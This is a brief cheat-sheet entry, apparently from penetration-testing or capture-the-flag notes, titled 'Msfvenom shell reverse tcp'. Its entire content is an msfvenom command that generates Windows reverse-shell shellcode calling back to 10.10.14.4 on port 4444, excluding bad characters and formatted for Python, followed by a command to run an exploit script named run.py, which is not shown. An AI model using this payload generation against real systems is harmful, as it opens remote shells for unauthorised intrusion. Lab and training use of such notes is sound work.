# Msfvenom shell reverse tcp

Windows Shell Reverse TCP Python

```bash
# Generate payload
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.4 LPORT=4444
EXITFUNC=thread -b "\x00\x0d\x0a" -f python

# Run
python2 run.py
```
